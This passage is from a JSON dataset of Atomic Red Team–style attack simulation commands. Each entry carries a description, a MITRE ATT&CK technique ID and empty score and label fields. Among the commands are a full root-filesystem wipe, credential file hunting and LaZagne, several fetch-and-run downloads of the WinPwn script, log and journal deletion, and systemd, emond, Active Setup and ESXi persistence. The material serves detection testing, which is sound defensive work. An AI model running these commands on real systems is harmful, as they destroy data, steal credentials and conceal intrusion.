current user by running the prerequisite commands first\"\n}\n",
        "Description": "Attempt to change the password of the current domain user in order to check password policy. Ideally, you would only run this atomic test to verify that your password policy is blocking the use of the new password.\nIf the password is succesfully changed to the new password, the credential file will be updated to reflect the new password. You can then run the atomic manually and specify a new password of your choosing, however the\npassword policy will likely prevent you from setting the password back to what it was. \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1098",
        "Shell": "powershell"
    },
    {
        "ID": 698,
        "Command": "$credFile = \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"\nif (Test-Path $credFile) {\n\\t$cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)\n\\tif($cred.GetNetworkCredential().Password -eq \"UPPER-LONG-SPECIAL-333\"){\n\\t  Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1\n\\t}\n\\ttry {\n\\t\\t$newPassword = ConvertTo-SecureString UPPER-LONG-SPECIAL-333 -AsPlainText -Force\n\\t\\tSet-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword\n\\t}\n\\tcatch { \n\\t\\t$_.Exception\n\\t\\t$errCode = $_.Exception.ErrorCode\n\\t\\tWrite-Host \"Error code: $errCode\"\n\\t\\tif ($errCode -eq 86) {\n\\t\\t\\tWrite-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\"\n\\t\\t\\tRemove-Item $credFile\n\\t\\t}\n\\t\\texit $errCode\n\\t}\n\\tWrite-Host -ForegroundColor Cyan \"Successfully changed the password to UPPER-LONG-SPECIAL-333\"\n\\t$newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"UPPER-LONG-SPECIAL-333\" -AsPlainText -Force))\n\\t$newCred.Password | ConvertFrom-SecureString | Out-File $credFile\n}\nelse {\n\\tWrite-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"\n}\n",
        "Description": "Attempt to change the password of the current domain user in order to check password policy. Ideally, you would only run this atomic test to verify that your password policy is blocking the use of the new password.\nIf the password is succesfully changed to the new password, the credential file will be updated to reflect the new password. You can then run the atomic manually and specify a new password of your choosing, however the\npassword policy will likely prevent you from setting the password back to what it was. \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1098",
        "Shell": "powershell"
    },
    {
        "ID": 699,
        "Command": "$credFile = \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"\nif (Test-Path $credFile) {\n\\t$cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)\n\\tif($cred.GetNetworkCredential().Password -eq \"onlyUPandLowChars\"){\n\\t  Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1\n\\t}\n\\ttry {\n\\t\\t$newPassword = ConvertTo-SecureString onlyUPandLowChars -AsPlainText -Force\n\\t\\tSet-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword\n\\t}\n\\tcatch { \n\\t\\t$_.Exception\n\\t\\t$errCode = $_.Exception.ErrorCode\n\\t\\tWrite-Host \"Error code: $errCode\"\n\\t\\tif ($errCode -eq 86) {\n\\t\\t\\tWrite-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\"\n\\t\\t\\tRemove-Item $credFile\n\\t\\t}\n\\t\\texit $errCode\n\\t}\n\\tWrite-Host -ForegroundColor Cyan \"Successfully changed the password to onlyUPandLowChars\"\n\\t$newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"onlyUPandLowChars\" -AsPlainText -Force))\n\\t$newCred.Password | ConvertFrom-SecureString | Out-File $credFile\n}\nelse {\n\\tWrite-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"\n}\n",
        "Description": "Attempt to change the password of the current domain user in order to check password policy. Ideally, you would only run this atomic test to verify that your password policy is blocking the use of the new password.\nIf the password is succesfully changed to the new password, the credential file will be updated to reflect the new password. You can then run the atomic manually and specify a new password of your choosing, however the\npassword policy will likely prevent you from setting the password back to what it was. \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1098",
        "Shell": "powershell"
    },
    {
        "ID": 700,
        "Command": "$credFile = \"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt\"\nif (Test-Path $credFile) {\n\\t$cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString)\n\\tif($cred.GetNetworkCredential().Password -eq \"Spring$((Get-Date).Year)!\"){\n\\t  Write-Host -ForegroundColor Yellow \"The new password is the same as the password stored in the credential file. Please specify a different new password.\"; exit -1\n\\t}\n\\ttry {\n\\t\\t$newPassword = ConvertTo-SecureString Spring$((Get-Date).Year)! -AsPlainText -Force\n\\t\\tSet-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword\n\\t}\n\\tcatch { \n\\t\\t$_.Exception\n\\t\\t$errCode = $_.Exception.ErrorCode\n\\t\\tWrite-Host \"Error code: $errCode\"\n\\t\\tif ($errCode -eq 86) {\n\\t\\t\\tWrite-Host -ForegroundColor Yellow \"The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials\"\n\\t\\t\\tRemove-Item $credFile\n\\t\\t}\n\\t\\texit $errCode\n\\t}\n\\tWrite-Host -ForegroundColor Cyan \"Successfully changed the password to Spring$((Get-Date).Year)!\"\n\\t$newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString \"Spring$((Get-Date).Year)!\" -AsPlainText -Force))\n\\t$newCred.Password | ConvertFrom-SecureString | Out-File $credFile\n}\nelse {\n\\tWrite-Host -ForegroundColor Yellow \"You must store the password of the current user by running the prerequisite commands first\"\n}\n",
        "Description": "Attempt to change the password of the current domain user in order to check password policy. Ideally, you would only run this atomic test to verify that your password policy is blocking the use of the new password.\nIf the password is succesfully changed to the new password, the credential file will be updated to reflect the new password. You can then run the atomic manually and specify a new password of your choosing, however the\npassword policy will likely prevent you from setting the password back to what it was. \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1098",
        "Shell": "powershell"
    },
    {
        "ID": 701,
        "Command": "gcloud config set project atomic-test-1\nKEY=`gcloud iam service-accounts keys list --iam-account=atomic-service-account@atomic-test-1.iam.gserviceaccount.com --format=\"value(KEY_ID)\" --limit=1`\ngcloud iam service-accounts keys delete $KEY --iam-account=atomic-service-account@atomic-test-1.iam.gserviceaccount.com --quiet\n",
        "Description": "This Atomic will: \n  - Create a service account\n  - Create a service account key, \n  - Store the result of retrieving a single key for that service account as a variable\n  - Pass that variable for deletion\n  - Delete the service account\n\nThe idea for this Atomic came from a Rule published by the Elastic team.\n\nIdentifies the deletion of an Identity and Access Management (IAM) service account key in Google Cloud Platform (GCP).\nEach service account is associated with two sets of public/private RSA key pairs that are used to authenticate. \nIf a key is deleted, the application will no longer be able to access Google Cloud resources using that key. A security best practice is to rotate your service account keys regularly.\n\nReference: https://github.com/elastic/detection-rules/blob/main/rules/integrations/gcp/impact_gcp_storage_bucket_deleted.toml\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1098",
        "Shell": "sh"
    },
    {
        "ID": 702,
        "Command": "echo \"[Unit]\" > /etc/systemd/system/art-timer.service\necho \"Description=Atomic Red Team Systemd Timer Service\" >> /etc/systemd/system/art-timer.service\necho \"[Service]\" >> /etc/systemd/system/art-timer.service\necho \"Type=simple\" >> /etc/systemd/system/art-timer.service\necho \"ExecStart=/bin/touch /tmp/art-systemd-timer-marker\" >> /etc/systemd/system/art-timer.service\necho \"[Install]\" >> /etc/systemd/system/art-timer.service\necho \"WantedBy=multi-user.target\" >> /etc/systemd/system/art-timer.service\necho \"[Unit]\" > /etc/systemd/system/art-timer.timer\necho \"Description=Executes Atomic Red Team Systemd Timer Service\" >> /etc/systemd/system/art-timer.timer\necho \"Requires=art-timer.service\" >> /etc/systemd/system/art-timer.timer\necho \"[Timer]\" >> /etc/systemd/system/art-timer.timer\necho \"Unit=art-timer.service\" >> /etc/systemd/system/art-timer.timer\necho \"OnCalendar=*-*-* *:*:00\" >> /etc/systemd/system/art-timer.timer\necho \"[Install]\" >> /etc/systemd/system/art-timer.timer\necho \"WantedBy=timers.target\" >> /etc/systemd/system/art-timer.timer\nsystemctl start art-timer.timer\nsystemctl enable art-timer.timer\nsystemctl daemon-reload\n",
        "Description": "This test creates Systemd service and timer then starts and enables the Systemd timer \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1053.006",
        "Shell": "bash"
    },
    {
        "ID": 703,
        "Command": "systemd-run --user --unit=Atomic-Red-Team --on-calendar '*:0/1' /bin/sh -c 'echo \"$(date) $(whoami)\" >>/tmp/log'\n",
        "Description": "Schedule a user level transient task (will not survive a reboot) without having to create the .timer or .service files by using the systemd-run command. \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1053.006",
        "Shell": "sh"
    },
    {
        "ID": 704,
        "Command": "systemd-run --unit=Atomic-Red-Team --on-calendar '*:0/1' /bin/sh -c 'echo \"$(date) $(whoami)\" >>/tmp/log'\n",
        "Description": "Schedule a system level transient task (will not survive a reboot) without having to create the .timer or .service files by using the systemd-run command. \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1053.006",
        "Shell": "sh"
    },
    {
        "ID": 705,
        "Command": "sudo cp \"PathToAtomicsFolder/T1546.014/src/T1546.014_emond.plist\" /etc/emond.d/rules/T1546.014_emond.plist\nsudo touch /private/var/db/emondClients/T1546.014\n",
        "Description": "Establish persistence via a rule run by OSX's emond (Event Monitor) daemon at startup, based on https://posts.specterops.io/leveraging-emond-on-macos-for-persistence-a040a2785124\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1546.014",
        "Shell": "sh"
    },
    {
        "ID": 706,
        "Command": "rm -f /tmp/victim-files/T1070.004-test.txt\n",
        "Description": "Delete a single file from the temporary directory\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1070.004",
        "Shell": "sh"
    },
    {
        "ID": 707,
        "Command": "rm -rf /tmp/victim-folder\n",
        "Description": "Recursively delete the temporary directory and all files contained within it\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1070.004",
        "Shell": "sh"
    },
    {
        "ID": 708,
        "Command": "shred -u /tmp/victim-shred.txt\n",
        "Description": "Use the `shred` command to overwrite the temporary file and then delete it\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1070.004",
        "Shell": "sh"
    },
    {
        "ID": 709,
        "Command": "del /f %temp%\\deleteme_T1551.004\n",
        "Description": "Delete a single file from the temporary directory using cmd.exe.\nUpon execution, no output will be displayed. Use File Explorer to verify the file was deleted.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1070.004",
        "Shell": "command_prompt"
    },
    {
        "ID": 710,
        "Command": "rmdir /s /q %temp%\\deleteme_T1551.004\n",
        "Description": "Recursively delete a folder in the temporary directory using cmd.exe.\nUpon execution, no output will be displayed. Use File Explorer to verify the folder was deleted.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1070.004",
        "Shell": "command_prompt"
    },
    {
        "ID": 711,
        "Command": "Remove-Item -path $env:TEMP\\deleteme_T1551.004\n",
        "Description": "Delete a single file from the temporary directory using Powershell. Upon execution, no output will be displayed. Use File Explorer to verify the file was deleted.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1070.004",
        "Shell": "powershell"
    },
    {
        "ID": 712,
        "Command": "Remove-Item -Path $env:TEMP\\deleteme_folder_T1551.004 -Recurse\n",
        "Description": "Recursively delete a folder in the temporary directory using Powershell. Upon execution, no output will be displayed. Use File Explorer to verify the folder was deleted.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1070.004",
        "Shell": "powershell"
    },
    {
        "ID": 713,
        "Command": "[ \"$(uname)\" = 'Linux' ] && rm -rf / --no-preserve-root > /dev/null 2> /dev/null || chflags -R 0 / && rm -rf / > /dev/null 2> /dev/null\n",
        "Description": "This test deletes the entire root filesystem of a Linux system. This technique was used by Amnesia IoT malware to avoid analysis. This test is dangerous and destructive, do NOT use on production equipment.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1070.004",
        "Shell": "sh"
    },
    {
        "ID": 714,
        "Command": "Remove-Item -Path (Join-Path \"$Env:SystemRoot\\prefetch\\\" (Get-ChildItem -Path \"$Env:SystemRoot\\prefetch\\*.pf\" -Name)[0])\n",
        "Description": "Delete a single prefetch file.  Deletion of prefetch files is a known anti-forensic technique. To verify execution, Run `(Get-ChildItem -Path \"$Env:SystemRoot\\prefetch\\*.pf\" | Measure-Object).Count`\nbefore and after the test to verify that the number of prefetch files decreases by 1.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1070.004",
        "Shell": "powershell"
    },
    {
        "ID": 715,
        "Command": "New-Item -Path $env:TEMP\\TeamViewer_54.log -Force | Out-Null\nRemove-Item $env:TEMP\\TeamViewer_54.log -Force -ErrorAction Ignore\n",
        "Description": "Adversaries may delete TeamViewer log files to hide activity. This should provide a high true-positive alert ration.\nThis test just places the files in a non-TeamViewer folder, a detection would just check for a deletion event matching the TeamViewer\nlog file format of TeamViewer_##.log. Upon execution, no output will be displayed. Use File Explorer to verify the folder was deleted.\n\nhttps://twitter.com/SBousseaden/status/1197524463304290305?s=20\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1070.004",
        "Shell": "powershell"
    },
    {
        "ID": 716,
        "Command": "rd /s /q %systemdrive%\\$RECYCLE.BIN\n",
        "Description": "An adversary clears the recycle bin in the system partition using rd to remove traces of deleted files.\n[Reference](https://thedfirreport.com/2024/08/12/threat-actors-toolkit-leveraging-sliver-poshc2-batch-scripts/)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1070.004",
        "Shell": "command_prompt"
    },
    {
        "ID": 717,
        "Command": "reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Nls\\Language\n",
        "Description": "Identify System language by querying the registry on an endpoint. \n\nUpon successful execution, result in number format can be looked up to correlate the language.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1614.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 718,
        "Command": "chcp\n",
        "Description": "Identify System language with the chcp command.\n\nUpon successful execution, result in number format can be looked up to correlate the language.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1614.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 719,
        "Command": "locale\n",
        "Description": "Identify System language with the `locale` command.\n\nUpon successful execution, the output will contain the environment variables that indicate\nthe 5 character locale that can be looked up to correlate the language and territory.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1614.001",
        "Shell": "sh"
    },
    {
        "ID": 720,
        "Command": "localectl status\n",
        "Description": "Identify System language with the `localectl` command.\n\nUpon successful execution, the key `System Locale` from the output will contain the\n`LANG` environment variable that has the 5 character locale result that can be looked\nup to correlate the language and territory.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1614.001",
        "Shell": "sh"
    },
    {
        "ID": 721,
        "Command": "[ -f /etc/locale.conf ] && cat /etc/locale.conf || cat /etc/default/locale\n",
        "Description": "Identify System language with the by reading the locale configuration file.\n\nThe locale configuration file contains the `LANG` environment variable which\nwill contain the 5 character locale that can be looked up to correlate the\nlanguage and territory.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1614.001",
        "Shell": "sh"
    },
    {
        "ID": 722,
        "Command": "env | grep LANG\nprintenv LANG\nset | grep LANG\n",
        "Description": "Identify System language by checking the environment variables\n\nUpon successful execution, the 5 character locale result can be looked up to\ncorrelate the language and territory. Environment query commands are likely\nto run with a pattern match command e.g. `env | grep LANG`\n\nNote: `env` and `printenv` will usually provide the same results. `set` is\nalso used as a builtin command that does not generate syscall telemetry but\ndoes provide a list of the environment variables.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1614.001",
        "Shell": "sh"
    },
    {
        "ID": 723,
        "Command": "dism.exe /online /Get-Intl\n",
        "Description": "The Windows utility DISM (Deployment Image Servicing and Management) can be used to display information about international settings and languages on the currently installed Windows image using an elevated terminal.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1614.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 724,
        "Command": "PathToAtomicsFolder\\..\\ExternalPayloads\\LanguageKeyboardLayout.exe\n",
        "Description": "This test executes a custom script called LanguageKeyboardLayout.exe which outputs the values of the following Windows API functions to the user terminal: \n\n`GetKeyboardLayout`, `GetKeyboardLayoutList`, `GetUserDefaultUILanguage`, `GetSystemDefaultUILanguage`, `GetUserDefaultLangID`.\n\nDocumentation for these functions is located [here](https://learn.microsoft.com/en-us/windows/win32/api/winuser/).    \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1614.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 725,
        "Command": "wmic /node:localhost os get Locale,OSLanguage,MUILanguages /format:table\n",
        "Description": "WMIC (Windows Management Instrumentation Command-line) is a command-line tool that provides a simplified interface to query and manage Windows system configurations, processes, and hardware information using WMI. \n\nThe command in this test retrieves information about the system's locale, operating system language, and multilingual user interface (MUI) languages.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1614.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 726,
        "Command": "$info = @{\n  UILanguage\\t = Get-WinUILanguageOverride\n  UserLanguages  = (Get-WinUserLanguageList).LanguageTag -join ', '\n  SystemLocale   = Get-WinSystemLocale\n  CurrentCulture = [System.Globalization.CultureInfo]::CurrentCulture.Name\n  CurrentUICulture = [System.Globalization.CultureInfo]::CurrentUICulture.Name\n  TimeZone\\t   = (Get-TimeZone).Id\n}\n$info.GetEnumerator() | ForEach-Object { \"$($_.Name): $($_.Value)\" }",
        "Description": "This PowerShell script collects key system settings, such as the UI language, user language preferences, system locale, current culture, UI culture, and time zone, into a hash table. \n\nIt then outputs these settings in a readable key-value format directly to the terminal. The script is simple and efficient for quickly displaying system configuration details.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1614.001",
        "Shell": "powershell"
    },
    {
        "ID": 727,
        "Command": "powershell -executionpolicy bypass -command \"PathToAtomicsFolder\\T1114.001\\src\\Get-Inbox.ps1\" -file $env:TEMP\\mail.csv\n",
        "Description": "Search through local Outlook installation, extract mail, compress the contents, and saves everything to a directory for later exfiltration.\nSuccessful execution will produce stdout message stating \"Please be patient, this may take some time...\". Upon completion, final output will be a mail.csv file.\n\nNote: Outlook is required, but no email account necessary to produce artifacts.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1114.001",
        "Shell": "powershell"
    },
    {
        "ID": 728,
        "Command": "fsutil usn deletejournal /D C:\n",
        "Description": "Manages the update sequence number (USN) change journal, which provides a persistent log of all changes made to files on the volume. Upon execution, no output\nwill be displayed. More information about fsutil can be found at https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/fsutil-usn\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1070",
        "Shell": "command_prompt"
    },
    {
        "ID": 729,
        "Command": "if (-not (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1070-2.txt\")) { New-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1070-2.txt\" -Force } \necho \"1234567890\" > \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1070-2.txt\"\nfsutil  file setZeroData offset=0 length=10 \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1070-2.txt\"\n",
        "Description": "Finds a file by user name (if Disk Quotas are enabled), queries allocated ranges for a file, sets a file's short name, sets a file's valid data length, sets zero data for a file, or creates a new file. Upon execution, no output\nwill be displayed. More information about fsutil can be found at https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/fsutil-file\n- https://tria.ge/230601-x8x6bsgb24/behavioral2\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1070",
        "Shell": "powershell"
    },
    {
        "ID": 730,
        "Command": "PathToAtomicsFolder\\..\\ExternalPayloads\\pscp.exe -pw pass PathToAtomicsFolder\\..\\atomics\\T1129\\src\\atomicvibes.vib root@atomic.local:/tmp\necho \"\" | \"PathToAtomicsFolder\\..\\ExternalPayloads\\plink.exe\" \"atomic.local\" -ssh  -l \"root\" -pw \"pass\" -m \"PathToAtomicsFolder\\..\\atomics\\T1129\\src\\esxi_vibinstall.txt\"\n",
        "Description": "An adversary can maintain persistence within an ESXi host by installing malicious vSphere Installation Bundles (VIBs).\n[Reference](https://www.mandiant.com/resources/blog/esxi-hypervisors-malware-persistence)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1129",
        "Shell": "command_prompt"
    },
    {
        "ID": 731,
        "Command": "find //.aws -name \"credentials\" -type f 2>/dev/null\n",
        "Description": "Find local AWS credentials from file, defaults to using / as the look path.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1552.001",
        "Shell": "sh"
    },
    {
        "ID": 732,
        "Command": "python2 laZagne.py all\n",
        "Description": "[LaZagne Source](https://github.com/AlessandroZ/LaZagne)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1552.001",
        "Shell": "bash"
    },
    {
        "ID": 733,
        "Command": "grep -ri password /\nexit 0\n",
        "Description": "Extracting credentials from files\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1552.001",
        "Shell": "sh"
    },
    {
        "ID": 734,
        "Command": "findstr /si pass *.xml *.doc *.txt *.xls\nls -R | select-string -ErrorAction SilentlyContinue -Pattern password\n",
        "Description": "Extracting Credentials from Files. Upon execution, the contents of files that contain the word \"password\" will be displayed.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1552.001",
        "Shell": "powershell"
    },
    {
        "ID": 735,
        "Command": "type C:\\Windows\\Panther\\unattend.xml\ntype C:\\Windows\\Panther\\Unattend\\unattend.xml\n",
        "Description": "Attempts to access unattend.xml, where credentials are commonly stored, within the Panther directory where installation logs are stored.\nIf these files exist, their contents will be displayed. They are used to store credentials/answers during the unattended windows install process.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1552.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 736,
        "Command": "for file in $(find /home -type f -name .netrc 2> /dev/null);do echo $file ; cat $file ; done\n",
        "Description": "This test looks for .netrc files (which stores github credentials in clear text )and dumps its contents if found.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1552.001",
        "Shell": "bash"
    },
    {
        "ID": 737,
        "Command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nsensitivefiles -noninteractive -consoleoutput",
        "Description": "Search for sensitive files on this local system using the SensitiveFiles function of WinPwn",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1552.001",
        "Shell": "powershell"
    },
    {
        "ID": 738,
        "Command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nSnaffler -noninteractive -consoleoutput",
        "Description": "Check Domain Network-Shares for cleartext passwords using Snaffler function of WinPwn",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1552.001",
        "Shell": "powershell"
    },
    {
        "ID": 739,
        "Command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\npowershellsensitive -consoleoutput -noninteractive",
        "Description": "Check Powershell event logs for credentials or other sensitive information via winpwn powershellsensitive function.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1552.001",
        "Shell": "powershell"
    },
    {
        "ID": 740,
        "Command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\npasshunt -local $true -noninteractive",
        "Description": "Search for Passwords on this system using passhunt via WinPwn",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1552.001",
        "Shell": "powershell"
    },
    {
        "ID": 741,
        "Command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nsessionGopher -noninteractive -consoleoutput",
        "Description": "Launches SessionGopher on this system via WinPwn",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1552.001",
        "Shell": "powershell"
    },
    {
        "ID": 742,
        "Command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nSharpCloud -consoleoutput -noninteractive  ",
        "Description": "Loot local Credentials - AWS, Microsoft Azure, and Google Compute credentials technique via function of WinPwn",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1552.001",
        "Shell": "powershell"
    },
    {
        "ID": 743,
        "Command": "$usernameinfo = (Get-ChildItem Env:USERNAME).Value\nGet-ChildItem -Hidden C:\\Users\\$usernameinfo\\AppData\\Roaming\\Microsoft\\Credentials\\\nGet-ChildItem -Hidden C:\\Users\\$usernameinfo\\AppData\\Local\\Microsoft\\Credentials\\\n",
        "Description": "Via PowerShell,list files where credentials are stored in Windows Credential Manager\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1552.001",
        "Shell": "powershell"
    },
    {
        "ID": 744,
        "Command": "dir /a:h C:\\Users\\%USERNAME%\\AppData\\Local\\Microsoft\\Credentials\\\ndir /a:h C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Credentials\\\n",
        "Description": "Via Command Prompt,list files where credentials are stored in Windows Credential Manager\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1552.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 745,
        "Command": "find //.azure -name \"msal_token_cache.json\" -o -name \"accessTokens.json\" -type f 2>/dev/null\n",
        "Description": "Find local Azure credentials from file, defaults to using / as the look path.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1552.001",
        "Shell": "sh"
    },
    {
        "ID": 746,
        "Command": "find //.config/gcloud -name \"credentials.db\" -o -name \"access_tokens.db\" -type f 2>/dev/null\n",
        "Description": "Find local Google Cloud Platform credentials from file, defaults to using / as the look path.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1552.001",
        "Shell": "sh"
    },
    {
        "ID": 747,
        "Command": "find //.oci/sessions -name \"token\" -type f 2>/dev/null\n",
        "Description": "Find local Oracle cloud credentials from file, defaults to using / as the look path.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1552.001",
        "Shell": "sh"
    },
    {
        "ID": 748,
        "Command": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\webcam\\NonPackaged\\C:#Windows#Temp#atomic.exe /v LastUsedTimeStart /t REG_BINARY /d a273b6f07104d601 /f\nreg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\webcam\\NonPackaged\\C:#Windows#Temp#atomic.exe /v LastUsedTimeStop /t REG_BINARY /d 96ef514b7204d601 /f\n",
        "Description": "[can-you-track-processes-accessing-the-camera-and-microphone](https://svch0st.medium.com/can-you-track-processes-accessing-the-camera-and-microphone-7e6885b37072)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1125",
        "Shell": "command_prompt"
    },
    {
        "ID": 749,
        "Command": "New-Item \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\" -Name \"atomic_test\" -Force\nSet-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\atomic_test\" \"(Default)\" \"ART TEST\" -Force\nSet-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\atomic_test\" \"StubPath\" \"C:\\Windows\\System32\\calc.exe\" -Force \n& $env:SYSTEMROOT\\system32\\runonce.exe /AlternateShellStartup",
        "Description": "This test will create an \"atomic_test\" key under 'HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components' to launch calc by configuring an active setup executable and \nforcing to run active setup using the \"runonce.exe /AlternateShellStartup\" command. \nWithout the \"runonce.exe /AlternateShellStartup\" command it would run during the next logon for each user.\n\nNote: If you logout before running the cleanup command, you will be required to go through the OOBE (out-of-box experience) setup sequence to log back in. \nThe payload will only run once unless the cleanup command is run in between tests.\n\n[Active Setup Explained](https://helgeklein.com/blog/active-setup-explained/)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1547.014",
        "Shell": "powershell"
    },
    {
        "ID": 750,
